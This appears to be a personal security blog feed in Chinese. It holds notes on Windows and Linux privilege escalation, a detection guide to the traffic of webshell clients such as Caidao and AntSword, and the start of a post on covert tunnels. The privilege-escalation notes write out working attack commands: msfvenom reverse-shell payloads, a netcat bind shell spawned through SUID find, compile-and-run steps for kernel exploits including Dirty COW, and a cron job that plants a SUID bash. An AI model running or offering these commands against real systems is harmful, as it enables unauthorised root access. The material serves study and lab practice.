<h2 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h2><h2 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a>系统配置错误提权</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>Windows在系统启动时，会伴随着一些高权服务启动，倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持</p>
<p>实现方法可借助：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Powershell中的PowerUp脚本</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br><span class="line"></span><br><span class="line">2.Metasploit中的攻击模块   #需要提前获取一个session</span><br><span class="line">exploit/windows/local/service_permissions</span><br></pre></td></tr></table></figure>

<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</p>
<p>MSF使用实战：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#寻找存在漏洞的服务</span><br><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#msf攻击模块</span><br><span class="line">exploit/windows/local/trusted_service_path</span><br><span class="line"></span><br><span class="line">#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</span><br><span class="line">set AutoRunScript migrate -f</span><br></pre></td></tr></table></figure>



<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看计算机的计划任务</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">#查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure>



<h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>常见的组策略首选项(Group Policy Preferences,GPP)列举如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">映射驱动器(Drives.xml)</span><br><span class="line">创建本地用户</span><br><span class="line">数据源(DataSources.xml)</span><br><span class="line">打印机配置(Printers.xml)</span><br><span class="line">创建、更新服务(Services.xml)</span><br><span class="line">计划任务(ScheduledTasks.xml)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Powershell获取cpassword</span><br><span class="line">Get-GPPPassword.ps1</span><br><span class="line"></span><br><span class="line">#Msf</span><br><span class="line">post/windows/gather/credentials/gpp</span><br><span class="line"></span><br><span class="line">#Empire</span><br><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure>



<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p>
<p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。</p>
<p>在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。</p>
<p>需要UAC的授权才能进行的操作列表如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置Windows Update</span><br><span class="line">增加、删除账户</span><br><span class="line">更改账户类型</span><br><span class="line">更改UAC的设置</span><br><span class="line">安装ActiveX</span><br><span class="line">安装、卸载程序</span><br><span class="line">安装设备驱动程序</span><br><span class="line">将文件移动/复制到Program Files或Windows目录下</span><br><span class="line">查看其它用户的文件夹</span><br></pre></td></tr></table></figure>



<p>UAC有如下四种设置要求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</span><br><span class="line">仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</span><br><span class="line">仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</span><br><span class="line">从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</span><br></pre></td></tr></table></figure>



<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p>
<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p>
<p>令牌分类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问令牌(Access Token)：表示访问控制操作主体的系统对象</span><br><span class="line">会话令牌(Session Token)：是交互会话中唯一的身份标识符。</span><br><span class="line">密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</span><br></pre></td></tr></table></figure>

<p>Windows的AccessToken有两种类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Delegation Token：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)</span><br><span class="line">Impresonation Token：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)</span><br></pre></td></tr></table></figure>

<p>Windows Access Token产生过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</span><br></pre></td></tr></table></figure>



<h3 id="实例"><a href="#实例" class="headerlink" title="*实例"></a>*实例</h3><p>2008之前的版本有用</p>
<p>先用msf生成后门</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft Windows XP Professional SP3和之前版本</span><br><span class="line">Windows Server 2003 SP2和之前的版本</span><br><span class="line">Windows Server 2003 x64和x64 SP2</span><br><span class="line">Windows Server 2003(用于基于ltanium的系统SP2和先前版本)</span><br><span class="line">Windows Server 2008 x32 x64</span><br><span class="line">Windows Server 2008(用于基于ltanium的系统)</span><br><span class="line">Windows Vista SP1和之前的版本</span><br><span class="line">Windows Vista x64 SP1和之前的版本</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220406101923961.png" alt="image-20220406101923961"></p>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在windows2008之前操作系统上.所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统。</p>
<p>pinjector进程注入工具针对-win2008以前操作系统</p>
<p><a href="https://www.tarasco.org/security/Process_Injector/processinjector.zip">下载地址</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l(查看当前系统的进程)，有PID</span><br><span class="line">pinjector.exe -p [PID] cmd.exe [port]（本地开放一个端口，对应的cmd）</span><br><span class="line">nc.exe [IP] [port]</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后用nc进行监听端口即可实现system权限操作</span><br></pre></td></tr></table></figure>



<p>pexec64 32进程注入工具针对-win2008及后操作系统-(佛系)</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220406105002375.png" alt="image-20220406105002375"></p>
<h2 id="烂土豆配合令牌窃取提权"><a href="#烂土豆配合令牌窃取提权" class="headerlink" title="烂土豆配合令牌窃取提权"></a>烂土豆配合令牌窃取提权</h2><p>RottenPotato (烂土豆)提权的原理可以简述如下:<br>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2.对这个认证过程使用中间人攻击(NTLM重放)，为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过—系列的Windows API调用实现的。<br>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户(IS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。<br>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户(就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀(IIS服务器权限)反弹meterpreter就会成功。</p>
<p>烂土豆比热土豆的优点是:<br>1.100%可靠<br>2.(当时)全版本通杀<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。<br>总之，我对这个的理解是通过中间人攻击，将COM(NT\[SYSTEM权限）在第二部挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>
<p>单纯令牌窃取: Web权限或本地提权</p>
<p>如配合烂土豆提权:Web或数据库等权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPROT=PORT -f exe &gt;shell.exe</span><br><span class="line">上传后用web权限执行文件</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse——tcp</span><br><span class="line">set lhost</span><br><span class="line">set lport</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>



<h2 id="Win2012-DLL劫持提权应用配合MSF-Web权限"><a href="#Win2012-DLL劫持提权应用配合MSF-Web权限" class="headerlink" title="Win2012-DLL劫持提权应用配合MSF-Web权限"></a>Win2012-DLL劫持提权应用配合MSF-Web权限</h2><p>原理: Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索:</p>
<p>1、应用程序加载的目录</p>
<p>2、C:\Windows\System32</p>
<p>3、C:\Windows\System</p>
<p>4、C:\Windows<br>5、当前工作目录Current Working Directory,CWD<br>6、在PATH环境变量的目录(先系统后用户)</p>
<p>过程:信息收集-进程调试(火绒剑)-制作dl并上传-替换dll-启动应用后成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f dll &gt;/opt/xxx.dll</span><br></pre></td></tr></table></figure>



<h2 id="Win2012-不安全的服务权限配合MSF-本地权限"><a href="#Win2012-不安全的服务权限配合MSF-本地权限" class="headerlink" title="Win2012-不安全的服务权限配合MSF-本地权限"></a>Win2012-不安全的服务权限配合MSF-本地权限</h2><h2 id="Win2012-不带引号服务路径配合MSF-Web-本地权限"><a href="#Win2012-不带引号服务路径配合MSF-Web-本地权限" class="headerlink" title="Win2012-不带引号服务路径配合MSF-Web,本地权限"></a>Win2012-不带引号服务路径配合MSF-Web,本地权限</h2><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="Linux提权自动化脚本利用-4个脚本"><a href="#Linux提权自动化脚本利用-4个脚本" class="headerlink" title="Linux提权自动化脚本利用-4个脚本"></a>Linux提权自动化脚本利用-4个脚本</h2><p>两个信息收集:LinEnum,linuxprivchecker<br>两个漏洞探针: linux-exploit-suggester linux-exploit-suggester2</p>
<p>信息收集有什么用哦?漏洞探针又有什么用哦?</p>
<p>LinEnum</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优先上传/tmp，这是临时文件的保存目录，可执行，可读写</span><br><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>



<p>linuxprivchecker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python linuxprivchecker.py</span><br></pre></td></tr></table></figure>

<p>linux-exploit-suggester</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x linux-exploit-suggester.sh</span><br><span class="line">./</span><br></pre></td></tr></table></figure>

<p>linux-exploit-suggester2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl linux-exploit-suggester2.pl</span><br></pre></td></tr></table></figure>



<h2 id="Linux提权SUID配合脚本演示-Vulhub"><a href="#Linux提权SUID配合脚本演示-Vulhub" class="headerlink" title="Linux提权SUID配合脚本演示-Vulhub"></a>Linux提权SUID配合脚本演示-Vulhub</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看权限ls -al</span><br><span class="line">rw写读x执行</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探针是否有suid</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">信息搜集</span><br><span class="line">shell后门文件上传到目标网站</span><br><span class="line">用冰蝎连接并反弹shell</span><br><span class="line">用msf接受会话</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">getuid</span><br><span class="line">upload /root/LinEnum.sh /tmp/LinEnum.sh</span><br><span class="line">shell</span><br><span class="line">id</span><br><span class="line">cd /tmp</span><br><span class="line">./LinEnum.sh</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看对比有没有</span><br><span class="line">1.nmap</span><br><span class="line">2.vim</span><br><span class="line">3.less</span><br><span class="line">4.more</span><br><span class="line">5.nano</span><br><span class="line">6.cp</span><br><span class="line">7.mv</span><br><span class="line">8.find</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch xiaodi</span><br><span class="line">find xiaodi -exec whoami \;</span><br><span class="line">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure>



<h2 id="Linux提权本地配合内核漏洞演示"><a href="#Linux提权本地配合内核漏洞演示" class="headerlink" title="Linux提权本地配合内核漏洞演示"></a>Linux提权本地配合内核漏洞演示</h2><p>提权过程:连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">pelr linux-exploit-suggester2.pl</span><br><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod +x 45010</span><br><span class="line">./45010</span><br><span class="line">id</span><br></pre></td></tr></table></figure>



<h2 id="Linux提权脏牛内核漏洞演示-linux-exploit-suggester"><a href="#Linux提权脏牛内核漏洞演示-linux-exploit-suggester" class="headerlink" title="Linux提权脏牛内核漏洞演示-linux-exploit-suggester"></a>Linux提权脏牛内核漏洞演示-linux-exploit-suggester</h2><p>vulnhub 靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG内核漏洞提权过程:寻可用-下exp-上&#x2F;tmp-编译exp-执行(无权限用chmod)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.76.0/24</span><br><span class="line">nmap -p1-65535 192.168.76.141</span><br><span class="line">msfconslole</span><br><span class="line">search drupal </span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhosts 192.168.76.141</span><br><span class="line">set rport 1898</span><br><span class="line">exploit</span><br><span class="line">getuid </span><br><span class="line">uoload /root/linux-exploit-suggester.sh /tmp/1.sh</span><br><span class="line">shell</span><br><span class="line">id</span><br><span class="line">cd/tmp</span><br><span class="line">ls</span><br><span class="line">1.sh</span><br><span class="line">./1.sh</span><br><span class="line">chmod +x 1.sh</span><br><span class="line">./1.sh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set target 0</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload /tmp/40837.cpp /tmp/40837.cpp</span><br><span class="line">shell</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow(有了密码了)</span><br><span class="line">su root</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="Linux提权本地环境变量安全"><a href="#Linux提权本地环境变量安全" class="headerlink" title="Linux提权本地环境变量安全"></a>Linux提权本地环境变量安全</h2><p>配合SUID进行环境变量提权-本地用户环境<br>手写调用文件-编译-复制文件-增加环境变量-执行触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    getuid(0);</span><br><span class="line">    system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">ps（进程）</span><br><span class="line">./ps(sh文件)</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">echo $PATH(输出环境变量多了一个tmp)</span><br><span class="line">ps(调用的tmp里的ps也就是sh)</span><br><span class="line">./shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure>



<h2 id="Linux提权本地定时任务安全"><a href="#Linux提权本地定时任务安全" class="headerlink" title="Linux提权本地定时任务安全"></a>Linux提权本地定时任务安全</h2><h3 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /ect/crontab</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/xiaodi/test.sh</span><br><span class="line">chmod +x /home/xiaodi/test.sh</span><br><span class="line">/tmp/bash</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>权限提升</tag>
      </tags>
  </entry>
  <entry>
    <title>常见webshell客户端的流量特征及检测思路</title>
    <url>/2022/03/01/%E5%B8%B8%E8%A7%81webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p>主流为11、14、16版，11到14功能性增强，14到16隐秘性增强。它支持PHP、JSP、ASP三种webshell的链接。</p>
<h2 id="11和14版本的流量特征"><a href="#11和14版本的流量特征" class="headerlink" title="11和14版本的流量特征"></a>11和14版本的流量特征</h2><h3 id="php类的webshell流量特征"><a href="#php类的webshell流量特征" class="headerlink" title="php类的webshell流量特征"></a>php类的webshell流量特征</h3><p>主要特征在body当中，将其中的流量解码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&quot;eval&quot;，eval函数用于执行传递攻击的payload</span><br><span class="line">2.(base64_decode($_POST[z0]))，将攻击payload进行base64解码，菜刀默认将攻击荷载base64编码，避免被检测</span><br><span class="line">3.&amp;z0=QGluaV9zZXQ...，传递攻击payload，参数z0对应$_POST[z0]接收到的数据，该参数值使用base64编码的，所以使用base64解码可以看到攻击明文。</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.少数地方eval函数被assert方法替代</span><br><span class="line">2.$_POST也会被$_GET、$_REQUEST替代</span><br><span class="line">3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</span><br></pre></td></tr></table></figure>

<h3 id="jsp类的webshell流量特征"><a href="#jsp类的webshell流量特征" class="headerlink" title="jsp类的webshell流量特征"></a>jsp类的webshell流量特征</h3><p>该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;参数用来加入攻击载荷。</p>
<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
<h3 id="asp类的webshell流量特征"><a href="#asp类的webshell流量特征" class="headerlink" title="asp类的webshell流量特征"></a>asp类的webshell流量特征</h3><p>其中body流量进行URL解码后其特征点有如下三个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.“Execute”，此函数执行传递的攻击payload，等同于php的eval</span><br><span class="line">2.OnError ResumeNext，大部分asp客户端中必有的流量，不管前边有任何错误，继续执行</span><br><span class="line">3.Response.Write和Response.End必有，完善整个操作</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">OnError Resume Next这个特征在大部分流量中存在，极少数没有。</span><br></pre></td></tr></table></figure>

<h2 id="16版的流量特征"><a href="#16版的流量特征" class="headerlink" title="16版的流量特征"></a>16版的流量特征</h2><h3 id="php类的webshell流量特征-1"><a href="#php类的webshell流量特征-1" class="headerlink" title="php类的webshell流量特征"></a>php类的webshell流量特征</h3><p>其中特征主要在body中，将body中部分如下：这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。其中特征点有如下三部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.“&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE”，这部分是将base64解码打断使用.来连接。</span><br><span class="line">2.@ev&quot;.&quot;al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。</span><br><span class="line">3.QGluaV9zZXQoImRpc3BsYXlf...，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。</span><br><span class="line"></span><br><span class="line">注意：有少数时候eval方法会被assert方法替代。</span><br></pre></td></tr></table></figure>

<h3 id="jsp类的webshell流量特征-1"><a href="#jsp类的webshell流量特征-1" class="headerlink" title="jsp类的webshell流量特征"></a>jsp类的webshell流量特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&amp;z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。</span><br><span class="line">注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</span><br></pre></td></tr></table></figure>

<h3 id="asp类的webshell流量特征-1"><a href="#asp类的webshell流量特征-1" class="headerlink" title="asp类的webshell流量特征"></a>asp类的webshell流量特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中body流量为：</span><br><span class="line">2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。</span><br><span class="line">或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。</span><br><span class="line">这种流量主要识别这几部分特征，在正常流量中基本没有。</span><br></pre></td></tr></table></figure>

<h1 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h1><p>大部分代码来源于菜刀，但是蚁剑扩充性好，可以对进行加密、混淆等绕过处理。蚁剑默认支持ASP以及PHP的webshell链接。</p>
<h2 id="PHP类链接特征"><a href="#PHP类链接特征" class="headerlink" title="PHP类链接特征"></a>PHP类链接特征</h2><p>其中body流量进行url解码后为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最明显的为@ini_set(&quot;display_errors&quot;,&quot;0&quot;);这段代码是基本所有webshell客户端连接php类webshell都有的一种代码，有的客户端会加密、编码。蚁剑是明文，好发现。</span><br></pre></td></tr></table></figure>

<h2 id="ASP类链接特征"><a href="#ASP类链接特征" class="headerlink" title="ASP类链接特征"></a>ASP类链接特征</h2><p>其中body流量进行url解码后为；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与菜刀很像。如OnError、ResumeNext、Response.End、Response.Write其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex&quot;&amp;cHr(101)&amp;&quot;cute,同时该流量也用了eval参数。</span><br></pre></td></tr></table></figure>

<h2 id="蚁剑绕过流量特征"><a href="#蚁剑绕过流量特征" class="headerlink" title="蚁剑绕过流量特征"></a>蚁剑绕过流量特征</h2><p>蚁剑包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是还有一个明显的特征，即参数名大多数以”_0x……”这种形式。所以以这种形式开头的参数名，后面为加密数据的数据包也是特征。</p>
<h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><p>流量进行了加密，且加密密钥使用者自己来设定，但是该拦截器对webshell的需求比较高，无法连接一句话木马，综上，该客户端的流量无法检测。</p>
<p>功能介绍</p>
<p><a href="https://xz.aliyun.com/t/2799">《利用动态二进制加密实现新型一句话木马之客户端篇》</a></p>
<p>工作原理</p>
<p><a href="https://xz.aliyun.com/t/2744">《利用动态二进制加密实现新型一句话木马之java篇》</a></p>
<p><a href="https://xz.aliyun.com/t/2758">《利用动态二进制加密实现新型一句话木马之.NET篇》</a></p>
<p><a href="https://xz.aliyun.com/t/2774">《利用动态二进制加密实现新型一句话木马之PHP篇》</a></p>
<h1 id="Cknife"><a href="#Cknife" class="headerlink" title="Cknife"></a>Cknife</h1><p>特征就是在body部分的参数值均为base64编码，将该部分进行base64解码后，其流量特征同中国菜刀一致</p>
<h1 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h1><p>Weevely是kail中自带的一款功能强大的WebShell客户端，该链接器首先自己生成webshell，在将该webshell上传至目的服务器后，通过Weevely进行链接，该链接流量属于加密流量，但是在该流量中还可以发现特征，进行区分。</p>
<p>该流量中的攻击载荷存在于Referer中，其中Referer中的路径中php的查询参数有以下参数名或值，即sa&#x3D;、source&#x3D;web、cd&#x3D;数字、url&#x3D;、ei&#x3D;，即可确定该流量为客户端流量。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>webshell的流量特征</tag>
      </tags>
  </entry>
  <entry>
    <title>隐藏通信隧道</title>
    <url>/2022/02/17/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>一般的网络通信，两个机器先建立TCP连接，然后正常数据通信，知道ip地址后可直接发送报文，不知道可以用域名解析，但是在实际中，可通过边界设备、软硬waf、ids检查阻断连接。</p>
<p>隧道就是绕过端口屏蔽的通信方式，waf两端数据包通过waf允许的数据包类型或端口进行封装，穿过防火墙，进行通信。当封装的数据包到达目的地，进行还原，并将其还原后的数据包发送到相应的服务器上。</p>
<p>CS、MSF无法上线，数据传输不稳定无回显、出口数据被监控、网络通信存在问题。</p>
<p>常用隧道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络层：IPv6、ICMP、GRE</span><br><span class="line">传输层：TCP、UDP、常规端口</span><br><span class="line">应用层：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure>

<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p>执行ping</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402090732542.png" alt="image-20220402090732542"></p>
